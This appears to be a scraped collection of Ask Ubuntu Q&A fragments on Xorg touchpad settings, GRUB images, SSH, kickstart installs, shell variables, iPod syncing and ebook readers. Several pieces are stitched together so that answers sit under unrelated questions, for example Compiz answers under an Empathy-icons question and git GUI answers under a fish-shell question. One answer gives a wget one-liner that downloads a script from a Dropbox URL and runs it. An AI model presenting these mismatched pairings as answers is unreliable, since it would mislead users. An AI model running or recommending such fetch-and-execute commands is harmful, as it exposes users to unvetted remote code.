In fact, for the \"TapButton\" option, the values djkeikyb is trying to use are the default and the daemon inverts them.\nRunning a script with the synclient commands at startup was not an option, because of the virtual terminal thing described by djkeikyb and also because any time I connected/disconnected my USB mouse, the values were also reset.\nI decided to disable the settings daemon for the mouse/touchpad properties. In a terminal type:\ngconf-editor\n\nThen go to apps > gnome_settings_daemon > plugins > mouse and dismiss the active option. Of course, the side effect is not being able to edit the mouse properties under System > Preferences > Mouse\n\nA: Ok, let's try to dive into\nXorg custom configuration:\nWith deprecation of HAL Xorg uses udev for device detection. Therefore any udev rules defined will be taken into account when it comes to configure XServer. However there is no need to define udev rules as Xorg supports configuration files, in fact defining udev rules is disouraged.\nCustom configuration files follow this priority:\n\n*\n\n*settings from /usr/share/X11/xorg.conf.d/\n\n*udev rules (I'm not quite sure about udev priority, maybe less)\n\n*settings from /etc/X11/xorg.conf.d/\n\n*settings in /etc/X11/xorg.conf\nwhere the good old, still supported xorg.conf has highest priority. Therefore any rules you put in /usr/share/X11/xorg.conf.d/ loose validity when other rules with a higher priority are found.\nTo define a custom configuration without xorg.conf file you need to create a folder /etc/X11/xorg.conf.d/ where you put your custom device configuration files in (here your 50-synaptics.conf). However any other definitions in an existing xorg.conf file will override these, therefore you need to remove your xorg.conf file.\nUnfortunately I have no access to a Synaptics Touchpad and cannot test if it really works. A very good tutorial on how to configure X can be found (though alien) in the Fedora Project Wiki.\nGood luck.\n\nA: At this point it looks like a bug. I'll move forward with asking around the synaptic and xorg mailing lists and filing a bug report.

Also, have a list of applications that the user can use, or better, a list that they cannot.\n\nA: For the internet connection, you'd have to create a script which ran on login which defines ufw rules to govern the conneciton.  You'd have to create one for yourself too in order to ensure that you don't inherit that profile when you login.\nDropbox is tricky since it uses Amazon ECS servers.

I have an brand new installation of Ubuntu 9.10 (karmic version) where everything is fine except the video resolution. In Ubuntu 9.10, the file xorg.conf is empty by default.\nI'm using an onboard video card, and Ubuntu can not find the right resolution for me. It always uses 800x600, but I need at least 1024x768. Also, my monitor is listed as Unknown Type.\nUbuntu did find the right resolution when I changed the monitor to a Samsung monitor.\nBy the way what are the generic settings to put inside xorg.conf?\nWhat is the settings for Refresh Rate, for example, I got a resolution of 1280x800, but the Refresh Rate generally between 60 ~ 80 htz is ZERO on my resolution..\nIn 1024 resolution my Refresh Rate is 75 htz..\nWhat is going on with my resolution and how to modify the Refresh Rate??\nMany Thanks!\n\nA: First, I would not install 9.10 (karmic) especially not as \"brand new  installation\" since its support ends within about two months: http://en.wikipedia.org/wiki/List_of_Ubuntu_releases#Release_history\nSecond: modern Xorg releases have the goal to work without any configuration file, just run-time detection is enough in most cases. Sure, if there is /etc/X11/xorg.conf it will be used still. You can generate one with Xorg -configure command (as root, of course from a text VT, not from running X), and you may modify it a bit later then, if you need to customize it. As far as I remember that command will generate the config file in your home with name like xorg.conf.new, so you need to move it to the right place too.\n", "Q: Why doesn't my grub background show?

Probably .jpg is unsupported\n\nA: I had to use a lower resolution image too. that worked right away. My screen resolution when booted is 1920 x 1080, but that size would leave the default purple backround up and no image. Using the Grub Customizer GUI (always) I loaded 1280 x 1024 and it loaded, but about 2/3 screen! My 1920 x 1080 is one of the HD sizes, so I looked up the next lowest HD size (1280 x 720) and the GRUB image this size loaded, almost full screen, and all is good. I'm using a HP Pavilion 22xi IPS monitor, and an Asus AMD Motherboard M4A785-M, not sure what exactly the video card is, low powered DVI-D something or other... I guess the boot resolution is lower than the full 1920 x 1080 after booted?\n", "Q: Running local script on a remote machine I want to run a sript that is present in local machine, but it should perform operations on remote machine.\nI have already generated public-private keys, so no password authentiaction is required\n\nA: ssh is a good Unix citizen; we can pipe it around, we can redirect it's output and input in whatever ways imaginable.\nssh user@host sh < your_script.sh\n\nThis command is a redirection: your shell will open the (local!) file your_script.sh and feed it as input to the ssh command. ssh, in turn, will tunnel its stdin to the remote command, namely, sh instance.  sh without arguments reads its script from stdin. Strictly speaking, the sh part is not even necessary — ssh runs shell by default — but it makes explanation easier.\nSo we got a sh instance, which is launched on remote host, but reads commands from your local file. Voila!\n\nA: This SO answers your exact question:bash - How do you use ssh in a shell script? - Stack Overflow\nssh user@host command\n#for example\nssh user@host ls\n\nIf you have a big script which you want to execute. Then you can copy the script to the remote machine using sftp and then execute it via the above command.\n", "Q: How to configure mail (mailutils) to use Maildir schema by default? When I type mail command, I get a \"No mail for USER\" answer, but there's indeed mail (it's in /home/USER/Maildir/new)\nI guess it has something to do with the mailbox being in Maildir format, instead of mbox, but I don't know how to tell mailutils (specifically the mail command) which format to use.\n\nA: Afaik \"mail\" utility checks mails at the location given with the MAIL environment variable. Try this command: MAIL=/home/USER/Maildir/ mail (for sure, replace USER with something meaningful & valid). If that works, it seems that you should set MAIL variable you can do it in your bash profile / rc file for example. You can check the content of your current MAIL variable with: echo $MAIL\n\nA: To fetch mail from users home directory, use mail with -f option\n mail -f /home/USER/Maildir/\n\n", "Q: Where do I add boot parameters to use ks.cfg I created a kickstart file ks.cfg and then I have put that in the bootable disk (Ubuntu 10.04), and then added the following line to the isolinux.cfg \nlinux ks=ks.cfg\n\nand have not removed any other lines from the isoconfig.cfg file. But the installation is not automated, it is asking for language and all.\nIf I remove include menu.cfg or any other line from isolinux.cfg I get a boot error.\nWhat should I do now to automate the installation. Where should i add the boot parameters so that installation will start from the ks.cfg?\n\nA: system-config-kickstart \nBasic Configuration: Location and language settings.\nInstallation Method: Switch this to ‘CD/ROM’.\nPartition information: Create a minimum of a root (/) partition of ext4 format and a swap partition. You can set the root partition to fill the free space on the disk.\nUser configuration: Create one user account and no root account if you are comfortable with Ubuntu’s standard rootless setup.\nPackage selection: This isn’t implemented in Ubuntu.\nCreating an unattended install consists of the following steps:\n\n*\n\n*Create a configuration file, ks.cfg, using the GUI Kickstart tool.\n\n*Extract the files from the Ubuntu install ISO.\n\n*Add the ks.cfg file to the install disk and alter the boot menu to add automatic install as an install option.\n\n*Reconstitute the ISO file.\n\nMuch of Kickstart’s ease of use is thanks to its graphical configuration tool. It’s in the Ubuntu repositories, so search for it using the package manager or install it via the command line, as follows:\nsudo apt-get install\nsystem-config-kickstart\n\nOnce installed, the Kickstart GUI tool should place itself in the System Tools menu of the application launcher. Launching it, you’ll be presented with about a dozen pages of options, but fortunately, all of them should be fairly self-explanatory to anyone who has installed Ubuntu before.\nNow save the Kickstart configuration file. By default it is called ks.cfg, but you can give it any name. It’s a good idea to check over the configuration file manually by launching it in a text editor. We now need to copy the files from the Ubuntu install CD-ROM into a directory on the hard disk. Download the alternative install ISO (rather than the live CD) from the Ubuntu website and place it in your home directory. Mount this disk from the command line:\nmkdir iso_mount\nsudo mount -o loop ubuntu-10.10-alternate-i386.iso.torrent iso_mount\n\nThis makes the files inside the ISO accessible via the directory iso_mount. Note that you can browse this directory using a file manager, but we’d recommend doing the actual file copying from the command line because hidden files and directories must be preserved. Copy the files to a directory inside your home directory and make them writable with:\nmkdir ubuntu_files\nrsync -a iso_mount/ ubuntu_files/\nsudo chmod -R 777 ubuntu_files\n\nPlace the Kickstart file that you have created into the ubuntu_files directory. Now we have to tell the install system where to find the Kickstart configuration file when it boots. Load text.cfg, located in the isolinux directory, into a text editor. This file contains the menu options that you first see when you boot an Ubuntu installation disk. Locate the menu options for a standard install and then cut and paste them so that you have a second copy. We’re going to alter it so that it looks something like this:\nlabel autoinstall menu label\n^Automatically Install Ubuntu kernel\n/install/vmlinuz append\nfile=/cdrom/preseed/ubuntu.seed\ninitrd=/install/initrd.gz\nks=cdrom:/ks.cfg –\n\nWe’ve altered the label and title of this new menu entry, added a reference to the location of the Kickstart file and removed the ‘quiet’ flag so that we get lots of progress information. This constitutes the entirety of the changes we have to make, and we can now re-create the ISO file.\ncd ubuntu_files\nmkisofs -D -r -V “$IMAGE_NAME” -cache-inodes -J -l -b isolinux/isolinux.bin -c isolinux/boot.cat -no-emul-boot -boot-load-size 4 -boot-info-table -o ~/autoinstall.iso .\n\nTake our tip: try booting the ISO inside a virtual machine to make sure it works. Notice that it does require some interaction at the very first menu.\n", "Q: Environment variable vs Shell variable, what's the difference? Somebody told me that:\n\nBASH isn't an environment variable,\n  it's a shell variable\n\nWhat's the difference?\n\nA: An environment variable is a globally available, in a program and it child programs. A shell variable is only available in the current shell. To make a shell variable available as an environment variable, use export VARNAME (without dollar $).\nExamples for clarification:\n$ SOME=VAR # define shell variable $SOME\n$ echo $SOME\nVAR\n$ env | grep SOME # note: no output\n$ export SOME # turn $SOME into an environment variable\n$ env | grep SOME\nSOME=VAR\n\nAnother way to define an environment variable:\n$ export ANOTHER=VALUE\n$ echo $ANOTHER\nVALUE\n$ env | grep ANOTHER\nANOTHER=VALUE\n\n\nA: $BASH is a local variable that is valid in the current (bash) shell only.\nEnvironment variables such as $SHELL are valid systemwide. In a current Bash shell, $BASH points to the execution path of bash, whereas $SHELL points to the shell defined as default (which may be of the same value).\nFor an explanation of environment variables see Environment Variables in Ubuntu Help.\n\nA: Shell Variable: Short Term, Applied only to current instance of the shell, Not applicable system wide\nEnvironmental Variable: Long Term Usage, Valid System Wide, Globally Allowed\nBy convention Shell Variable have their name as lowercase while Envn. Variables are written as uppercase\n\nA: There is a difference. Shell Variables and Environment Variables will explain it better that I can, but here is an excerpt from it:   \n\nIf a change is made to a shell variable, it must be explicitly \"exported\" to the corresponding environment variable in order for any forked subprocesses to see the change. Recall that shell variables are local to the shell in which they were defined.\n\n\nA: To answer this question first try to understand scope of a variable.\nWhen you create a new variable like SOME_ENV_VARIABLE=\"testing.txt\" it resides in the SHELL scope, that means it can be accessed by that instance of shell where the user is logged in. When the instance change for example you open a new terminal or you change the shell (for example you switch to csh) you can not access that variable.\nWhen you export that variable like export SOME_ENV_VARIABLE that variable is now available in environment scope, that means in that instance if you change the shell you can still access that variable. Lets try to understand with following example:\n[vishrant@localhost]$ SOME_ENV_VARIABLE=\"testing.txt\" #creating variable in bash shell\n[vishrant@localhost]$ echo $SOME_ENV_VARIABLE\ntesting.txt\n[vishrant@localhost]$ export SOME_ENV_VARIABLE #variable now available with environment\n[vishrant@localhost]$ env | grep SOME_ENV_VARIABLE\nSOME_ENV_VARIABLE=testing.txt\n[vishrant@localhost]$ csh #changing shell\n[vishrant@localhost ~/shell_scripting]$ echo $SOME_ENV_VARIABLE\ntesting.txt\n[vishrant@localhost ~/shell_scripting]$ exit\nexit #returned to parent shell\n[vishrant@localhost]$ SOME_SHELL_VARIABLE=\"hello.txt\"\n[vishrant@localhost]$ csh\n[vishrant@localhost ~/shell_scripting]$ echo $SOME_SHELL_VARIABLE\nSOME_SHELL_VARIABLE: Undefined variable.\n\nAnalogy: let's assume you have a two-bedroom apartment and you are sharing it with another roommate. The common area can be accessed by anyone but not your bedrooms, environment variable is like common area and shell variable is like bedroom, if you will something in common area it can be accessed by anyone but if you keep it in your bedroom it can only be accessed by you.\nRemember if open a new terminal you won't be able to access either of the variables because you are changing that instance. For that you should add your variables in either .profile or .bashrc (if you are using bash).\n", "Q: gnome-power-manager is necessary to spin down hard disks? With modern hard disks is necessary to use gnome-power-manager to spin down the hard disks? Or are they prepared to sleep automatically after certain amount of inactivity time?\n\nA: Yes, you do need software like gnome-power-manager to spin down hard disks. Modern hard drives sometimes have features like SMART, but this only collects information. Psusi mentions another great utility, hdparm, that plays with power settings (among many other things). Hdparm is more powerful and more advanced, gnome-power-manager is likely easier. More than one way to skin a cat.\n\nA: Some ( mostly laptop ) hard disks have such a feature, but not all do.  gnome-power-manager works with all disks.  For disks that support the APM auto standby timer, you can enable it with hdparm -S, or sometimes -B.\n", "Q: Change Empathy's status icons I installed a new icon theme but I want to use custom Empathy's status icons.

Compiz may complain that there are already functions set to the edge bindings you want to use - replace them with yours.\n\nA: One of the differences between most Unix window managers and Windows is that most Unix window managers offer resistance to the movement of windows at the edges of the screen. Therefore you don't need any special commands to move windows to the left or right edge of the screen; just drag one toward an edge and it will stop when it gets there. I don't know of any Gnome (the standard Ubuntu window manager for now) keyboard shortcuts that move windows.\n\nA: This is easy to enable from the CompizConfig Settings Manager. (Install it, if you haven't already).\nThen under Window Management, enable Grid. I've kept the default bindings of CTRL+ALT+NumPad but you can easily change it Super + Arrow as you prefer.\n", "Q: How can I sync with an iPod Nano 6G? I'm having no luck at all with this iPod Nano.\nI've tried the following software:\n\n\n*\n\n*Banshee - The iPod shows up and files seem to be copied, but they don't show up on the iPod.\n\n*Rhythmbox - Same as Banshee. Claims to sync but no files available on the iPod\n\n*gPodder - At first it wouldn't even recognize the device even though I set the mount point and device type. After syncing one file to the iPod from iTunes on my mac it now behaves as Banshee and Rythmbox. \n\n*gtkpod - Again: Copies the files but they are inacessible on the iPod.\n\n*Hipo - Doesn't even recognize the iPod\n\n*Amarok - What is this, I don't even...\n\n\nSo to summarize: After some fiddling I can get most of these apps to recognize the iPod and copy files to it, but they are not accessible on the iPod which sort of defeats the whole purpose.\nHelp me out here. My continued harmonic love life depends on it. (Yes, it's the girlfriends iPod and laptop)\n\nA: I had the same problem and fixed it with the sledgehammer method: \nVirtual Windows system + ITunes.\nI installed virtualbox 4 and set up a Windows XP. To use the USB drivers I installed the  Oracle Expansion Pack. The Licence changes from OSE (Open Source Edition) to PUEL (Personal Use and Evaluation License). \nPlugin the Ipod to your Ubuntu System.\nStart the VM with Windows and Itunes.\nUnder \"Devices\" in the Virtual Box select your ipod nano.\nWindows and Itunes will find it.\nI also shared my music-library with a virtualbox shared folder and mountet it under windows.\nThis works for me but I am unhappy with the situation too.\n\nA: I just tried the solution, syzygy proposed: I installed the Spotify client preview for Linux and synced my iPod Nano 6G with it. So far it works. \nBe aware that first Spotify wipes the iPod and then gives you the possibility to sync playlists. Spotify doesn't have the same comfort as Rhythmbox or Banshee yet, but I am happy that there is finally a solution for the iPod Nano 6G.\nThis works with a free account.\n\nA: I've been running into the same problem. The gtkpod website specifically says that the iPod Nano 6G is not supported by libgpod yet.\nUnfortunately a whole bunch of ipod syncing software uses libgpod as a sort of base. and so far that isn't an easy hack for it either. most sites i found talking about talking about jailbreaking the 6G offer a long and painful process with little to no useful results for the average user.\nIt looks like at this point we have to wait until someone smarter comes along and comes up with a practical solution.  \nOr sell your nano and buy an older model....\n\nA: I figured out to use it in Banshee in Ubuntu 12.04 in 32 bits.\n\n\n*\n\n*Install libgpod4_0.8.2 and libgpod-common_0.8.2 from http://franck78.ath.cx/\n\n*Downloaded libhashab.so and in root mode place it in /usr/lib/libgpod and put all permisions to read and write.\nThat's it \n\nA: Apparently Apple borked linux support with Nano 6g, and it's proven difficult to hack the music database to allow access to non-iTunes apps.\nhttps://bugzilla.gnome.org/show_bug.cgi?id=631006\nhttp://ubuntuforums.org/showthread.php?t=1611473\n\nA: You can use spotify. They have a very nice linux version. The only  problem is that you can only get it with the 5 dollar a month account but it is totally worth it!\n\nA: gtkpod , Banshee, and Rhythmbox do not support this player. Put a virtual machine with windows 7 for ITunes.\n\nA: Spotify for Linux will now work with a Free account (as of October) so it is THE solution to manage (sync) your music simply within Ubuntu.\nWorks with Lucid 32bit (and earlier versions I guess). Not tested with 64bit\n\nA: I am not sure that this works, and you will certainly have to reset your iPod in iTunes so that you unlock syncing (you can only officially sync with one computer), but Spotify has iPod syncing.\n\nA: I own the iPod 6G Nano as well. Unfortunately there is no linux support for it as of yet (even in 12.04). The only solution would be either run Windows in a Virtual Box with iTunes or maybe iTunes 10 under WINE\n\nA: GTKPod\ngtkpod provides a graphical user interface that enables users of Linux and other Unix operating systems to transfer audio files onto their iPod Classic, iPod Nano, iPod Shuffle, iPod Photo, or iPod Mini music players. Although it does not support some of the more advanced features of iTunes, gtkpod still performs the role of an iPod manager for Linux. Album art and videos are now supported, and preliminary support for jailbroken iPhones and iPod Touches is available.\n\nIts available to install from the Ubuntu Software Centre\n\nA: Have you looked into installing iTunes? Install Playonlinux and they have Itunes 10. It's really simple to download and use. I have not tried this, but it should work gl!\n", "Q: I think \"/lib/modules/$(uname -r)/build\" points to incorrect folder I compile/create my own deb packages of kernel with:\nmake-kpkg --rootcmd fakeroot --initrd --append-to-version=$version --revision=1 kernel_image kernel_headers\n\nBut when I install both packages, in /lib/modules/(*name_kernel_compiled*) it creates two links, sources and build, pointing to folder with sources, from I've compiled.\nsources link is correct but build should point to /usr/src/linux-(version kernel), don't you think?\n\nA: The /lib/modules/<version>/build symlink should point to the build directory - ie, where the object files were placed during the kernel build. In your case, your source dir is the same as your build dir, so both symlinks will point to the same directory.\n\nA: The solution is in make-kpkg documentation:\n\nYou can look at other example in the examples directory: /usr/share/kernel-package/examples/ to see if there are other example script you want to cp into /etc/kernel -- and you can create your own scripts.\n\n\n\nFor example, if you use linux-headers-* packages to compile third party modules so that you do not have to keep the sources directory around, you might be interested in:\n\n/etc/kernel/header_postinst.d/link\n/etc/kernel/header_postrm.d/link\n/etc/kernel/header_prerm.d/link\n/etc/kernel/postinst.d/force-build-link\n/etc/kernel/postrm.d/force-build-link\n\n\nThese scripts will try to make sure that the symlink /lib/modules/$VERSION/build is sane -- that is points to the header packages whether you install the image packages first, or the header packages first -- and takes care of cleanup when either of the packages are installed.\n\n", "Q: How to add .pac files?

Then you can install .deb package using \"dpkg -i\". Download RPM package (64bit or 32bit), and run following commands:\nsudo apt-get install alien fakeroot\nfakeroot alien MySQL-devel-5.5.9-1.linux2.6.i386.rpm\ndpkg -i mysql-devel_5.5.9-2_i386.deb\n\nThat is better than installing from source code, as now files are tracked by dpkg (backend for apt, aptitude and other package managers in Ubuntu).\nThere is no PPA offering newest mysql-server for Ubuntu, at least I couldn't find it. 5.1 is considered as stable mysql, while 5.5 is \"upstream version\". There will be Ubuntu packages, but good question is when.\n", "Q: Exporting bash function in .profile or .xprofile kills X during login I'm trying to export a bash function during Gnome login using one of the login shell start-up scripts. I've tried doing it in ~/.profile and ~/.xprofile but it results in X dying and restarting at the login screen.\nI am able to export environment variables from these scripts without problems during Gnome login; only exporting a function (any function, regardless of content) kills X.\nI can also source both scripts from a terminal and the function is exported as expected without any problems. The function also gets exported fine if the scripts are invoked by a bash login shell (bash -l) from a terminal.\nWhy is exporting a function at Gnome login killing X? / Can I do anything to fix it?\n(I realise I could export the function from .bashrc, but using a profile is more convenient in my situation and I'd like to understand why this crash is happening.)\n\nA: POSIX sh does not allow functions to be exported, but bash does. ~/.profile is sourced by a POSIX shell, not bash. It's also rather pointless to export functions since only bash can read and use them. Just put the functions in ~/.bashrc, and don't export them.\n\nA: The accepted answer is incorrect. POSIX-compliant shells do allow functions to be exported.\nThe problem you had is probably because you were using the function keyword. POSIX syntax does not use function. Remove the function keyword and make sure you have parentheses after the function name and login will work again.\n", "Q: How to have a path containing spaces in PATH? I tried \nexport TASK=$HOME/Ubuntu\\ One and export TASK=\"$HOME/Ubuntu One\" \nbut neither works. \n\nA: Try\nexport TASK=\"$HOME/Ubuntu\\ One\"\n\nIn both exports you issued, when you echo $TASK, the result is\n/home/user/Ubuntu One\n\nThis is not the expected behavior because when you write something like\ncp $TASK/file somewhere_else/\n\nbash will expand it to\ncp /home/user/Ubuntu One/file somewhere_else/\n\nwhich is, of course, incorrect.\nTherefore, we need to put our path in quotation marks, and escape the space.\n\nA: It's not the definition you're having issues with, it's the use.You need to wrap wherever you're using the variable in quotes. See this example:\noli@bert:~/Music$ export B=\"$HOME/Music/Yeah Yeah Yeahs/\"\noli@bert:~/Music$ cd $B\n-bash: cd: /home/oli/Music/Yeah: No such file or directory\noli@bert:~/Music$ cd \"$B\"\noli@bert:~/Music/Yeah Yeah Yeahs$\n\n\nA: This page explains the issue in detail. It's a good idea to read it thoroughly http://mywiki.wooledge.org/Arguments\n\nA: This awkward and clumsy behaviour is the result of an unwise choice in the name of the \"Ubuntu One\" directory.  Unfortunately, there seems to be no fix planned for this.\nOne option is to use Dropbox, which offers similar functionality.\n\nA: Rather than resorting to Dropbox, I made a symbolic link:\nln -s Ubuntu\\ One UbuntuOne\n\nIn my particular case I wanted to import python modules from a directory on my cloud:\nln -s Ubuntu\\ One/pythonfiles pythonfiles\nexport PYTHONPATH=\"$PYTHONPATH:$HOME/pythonfiles/\"\n\nI agree, it is idiotic to put spaces in linux filenames.\n", "Q: How to determine what modules are missing I got an \"FATAL ERROR: Could not find /lib/modules/2.6.35-25-generic: file not found\" or something like this when booting.

Any help is appreciated.\n\nA: I have the same Inspiron 1545 with the 14e4:4315 card, and for me the broadcom-sta driver works without issue. (I've worked really hard to get the non-sta/wl drivers working on all kinds of distros and this particular wlan card just seems to be difficult)\nI am guessing that there's some kind of error with the blacklisting of the other available broadcom drivers that ship w/ the kernel (b43, b43xx b43legacy). if you post the output of your  error message when you install, lsmod when it's working and lsmod when it's not... that should be a good start.\nyou should also look at the contents of /etc/modprobe.d/blacklist-bcm43.conf. it should contain the following, which disables the wrong drivers from being loaded:\nblacklist b43\nblacklist b43legacy\nblacklist ssb\nblacklist bcm43xx\n\n\nA: See: Setup to always load at boot time\n\nA: one way to diagnose this would be to run, on a terminal:\ndpkg --list firmware-b43-*\n\nlook at the package names and statuses (the two leftmost columns read \"ii\" for installed packages).\nI see three b43-related packages in the list of possibilities:\n\n\n*\n\n*firmware-b43-installer\n\n*firmware-b43-lpphy-installer\n\n*firmware-b43legacy-installer\n\n\nFor your card (LP-PHY variant) you'd want firmware-b43-lpphy-installer to be installed. I have seen the driver installation tool get it \"wrong\" and install firmware-b43-installer instead (but that installs a module that doesn't work with the LP-PHY hardware).\nIf it turns out you don't have firmware-b43-lpphy-installer installed, do so by running this on a terminal:\nsudo apt-get install firmware-b43-lpphy-installer\n\nMake sure to have a fallback wired connection handy, if the firmware-b43-lpphy-installer fails, you can remove it:\nsudo apt-get remove firmware-b43-lpphy-installer\n\n", "Q: FAT32 partition lock A am asking about problem with USB data stick (that uses fat32 file system).\nIf you unplug USB stick without unmounting (safly remove) data may become locked when you mount USB stick another time (you can't make changes to files).

But it has happened many times even recently.\nHas this been happening to someone else?\n\nA: If you unplug a USB flash drive without unmounting it first you can easily have data loss.\nThe type of messages you are seeing is a reflection that the data is not clean and some of it is thus locked. fsck will fix these issues as well, but sometimes with data loss.\nWhen mounting a file system the kernel prepares the file system for use, and when unmounting the kernel reverses the process including checking that none of the files are in use and that your data has been written to the disk (your data can be cached and not yet written).\nSee man sync, man fsck, and http://tldp.org/LDP/tlk/fs/filesystem.html for details.\n", "Q: Session management error: None of the authentication protocols specified are supported The title is the first error that has sent me on a mission to fix things.\nMotivation:\nI was trying to install the new Enthought Python Distribution -- when the error above first showed up.

I will try and forward port 631 to W, and add a printer on W like http://localhost:631/printers/hp\n\nA: Well... I'd say you can ssh your U machine and then issue the necessary lp or lpr commands. It's a bit of DIYish, but if ssh is already configured there's no need to open any ports.\nMaybe this would work, from command line:\ncat yourfile.pdf | ssh user@yourubuntumachine lpr\n\nBut maybe there's a quicker way... Let's see what others say.\n\nA: I found this \"how to.\" i think it can be your solution\nHOWTO Print remotely through ssh access\nFrom that article:\n\n\n*\n\n*Forward a local printer port to the remote printer:\nssh -R127.0.0.1:9100:remote_printer_ip_address:9100\n\n\n*Connect your remote box local port which has been forwarded; in other words, pretend that 127.0.0.1 is your printer.\n\nA: If you have FreeNX server installed you can actually access the box in video mode with collaboration of ssh server.\nThis will help you in a way that you can actually view the file :) and do the stuff.\nBUT THIS WILL MAKE THINGS a bit lengthier.\n\nA: In the end I forwarded port 631 to the windows machine. I can access the cups interface in the browser of the windows machine when I go to localhost:631. I was able to add a printer like http://localhost:631/printers/hp using the add printer dialog of the windows system.\nI am using autossh to forward the port, so the ssh connection is more stable.\n", "Q: How do I set fish as the default shell?

Any help would be greatly appreciated....\n\nA: For a GUI based setup, you may try cgit. Here is a tutorial for setting up cgit in ubuntu. \n\nA: WHat is \"GUI based setup\"? In its core, \"git clients\" and \"git servers\" (for real GIT is distributed system, not so much \"central server\" and \"clients\" exists unlike in SVN or CVS, but for sure you can treat a GIT repository as the \"master one\") communicate through the network, so no \"GUI\" is needed here. What you can do in GUI: you can have GUI to work on your repository (even maybe integrated into your IDE) or some kind of \"GUI\" (let's say a web based one) where you can examine the content of the repository. If you mean this, you may need (of course you can find more!) gitweb. It's in the Ubuntu's repositories (can be installed with apt-get) and written as perl. It acts a CGI solution.

Rename the directory with mv, eg:\nmv ./\\~ ./a-nice-sensible-directory-name\n\nThen delete it.\n\n*If in doubt, use the -i flag when dealing with potential fubars.

You can check which version of java is being used with\njava -version\n\nat the command line. There are two packages for OpenJDK in Ubuntu, openjdk-6-jre and openjdk-6-jre-headless. The headless version is intended for computers with no GUI. You have the headless version installed, causing this error when the arduino program tries to create GUI elements.\nTo resolve this problem, install the non-headless version. It will take over from the headless version, and the arduino IDE will start.\napt-get install openjdk-6-jre\n\nWhen you installed arduino from the repositories this dependency ought to have been taken care of for you. I have raised a bug for this (Bug entry)\n\nA: I had this issue with JDK7 installed. I successfully switched back to my JDK6 with this command:\nsudo update-alternatives --config java\n\nAnd that did the trick\n\nA: I also had this problem after installing arduino using apt-get as detailed at http://playground.arduino.cc//Linux/Ubuntu\nI found the solution was switching my JDK runtime from 7 to 6 using \nsudo update-alternatives --config java\n\n\nA: The answer has been moved but can't be found at StackOverflow.

It manages your ebook collection for you. It is designed around the concept of the logical book, i.e. a single entry in the database that may correspond to ebooks in several formats. It also upports conversion from a dozen different ebook formats to LRF and EPUB. A graphical interface to the conversion software can be accessed easily by just clicking the \"Convert E-books\" button.\nSupported input formats are: MOBI, AZW, LIT, PRC, EPUB, ODT, HTML, CBR, CBZ, RTF, TXT, PDF and LRS.\n\nStarting calibre's ebook viewer as a standalone application\nIn certain cases you will not want to add an epub or mobi file to calibre's library before reading it. Luckily calibre's ebook viewer can be started independently via ebook-viewer. This makes it possible to create a standalone launcher:\n#!/usr/bin/env xdg-open\n[Desktop Entry]\nVersion=1.0\nType=Application\nTerminal=false\nIcon=calibre\nExec=ebook-viewer %f\nName=Ebook Viewer\nComment=Display .epub files and other e-reader formats\nStartupWMClass=ebook-viewer\nMimeType=application/x-mobipocket-ebook;application/epub+zip;\n\nSee here for more information on adding launchers to your system.\n\nTo click an ebook and open in ebook-viewer, make this application (/usr/bin/ebook-viewer) the default for that type of file.\n\nA: Foliate is one of the best applications for reading epub and Mobi files.\n\nYou can use your favorite method for obtaining it.\nPPA\nsudo add-apt-repository ppa:apandada1/foliate\nsudo apt update\nsudo apt install foliate\n\nFlatpak\nflatpak install flathub com.github.johnfactotum.Foliate\n\nSnap\nsudo snap install foliate\n\n.deb file\nGrab the latest version from here.\nWebsite: https://johnfactotum.github.io/foliate/\nFor more information:\nhttps://www.omgubuntu.co.uk/2019/07/install-foliate-ebook-reader-on-ubuntu\n\nA: Use FBReader, which is available as 'Ebook Reader' in the Software Center (fbreader in Synaptic Manager).

This is very useful, but makes it difficult to navigate web pages by keyboard - After focusing a form control, you'll have to press Tab or Shift-Tab until you get to a URL to be able to navigate with the keyboard again. If there is no URL on the web page (shock, horror) the mouse seems to be the only way out.\nSo is there a keyboard shortcut to give focus back to the page itself?\n\nA: While there isn't really a shortcut to what you asked, there are workarounds, the easiest being hitting F6 twice. The first time will take you to the URL-bar, the second will go back to the page (works in Firefox 3.6.16, didn't try Firefox 4 yet). \nI know this it not really satisfying but you'll get used to it fast.\nSee http://support.mozilla.com/en-US/kb/Keyboard%20shortcuts#w_current-page.\nAnother thing mentioned on http://support.mozilla.com/en-US/kb/Accessibility#w_html-access-keys and the \"proper\" way is\n\nHTML Access Keys\n  On some web pages, keyboard shortcuts are assigned to different elements on the page. To move the cursor directly to one of these elements, press Shift+Alt+AccessKey.\n  Which key AccessKey is depends on the website. It is determined by the website author, not Firefox.\n\nIt's declared like this <input type=\"text\" size=\"40\" value=\"Feld\" accesskey=\"f\"> so if you have this problem on a particular site just grep for accesskey in \"Site Information\" (STRG + I on german keyboard  layout).\n\nA: In general, all you need is a keyboard shortcut that calls the following JavaScript:\ndocument.activeElement.blur();\n\nAny browser extension that lets you create custom JavaScript keyboard shortcuts should do the trick. I'm not familiar with the capabilities of Greasemonkey, but I suspect it might provide an easy way to do this.\n\nA quick Google search revealed an existing Firefox extension that appears to already accomplish something similar. I had success doing the following:\n\n\n*\n\n*Install the Firefox extension Unfocus.\n\n*Create a keyboard shortcut in Ubuntu that runs firefox -unfocus.\n\n\nI think Mod4+Tab is a nice choice for this in order to maintain similarity to the existing shortcut for changing focus.\n\nA: If you're lazy, run this at terminal, and skip to step \"6\": \ncd ~/ && wget dl.dropbox.com/u/4098082/unfocusdo.sh && chmod +x ~/unfocusdo.sh && ~/unfocusdo.sh && rm ~/unfocusdo.sh  \n\nStep by step instructions:\nThis workaround should work with all browsers:\n1) We will need XDoTool and Compiz.\nYou can install these from the Ubuntu Software Center or by clicking here (xdotool) and here (Compiz)\n2) Make a file .unfocus.sh in your home folder.\n3) Paste this into it:  \n\n#!/bin/bash\n#\n# by desgua\n#\n# To focus at page instead of formulary\nsleep 0.1\nWI=$(xdotool getactivewindow)\neval $(xdotool getmouselocation --shell)\n    xdotool mousemove --window $WI 0 250 click --clearmodifiers 1\n    xdotool mousemove $X $Y\nexit 0  \n4) Make it executable  (Here's how to do that).  \n5) Open Compiz (Alt + F2 and type ccsm and hit Enter)  \n6) Go to Commands and add ~/.unfocus.sh to one command   \n7) Then go to Keybindings and make a shortcut for it.  \n", "Q: Repair gzipped tar I have a pretty large(50Gb) tar.gz file that I can't untar anymore.

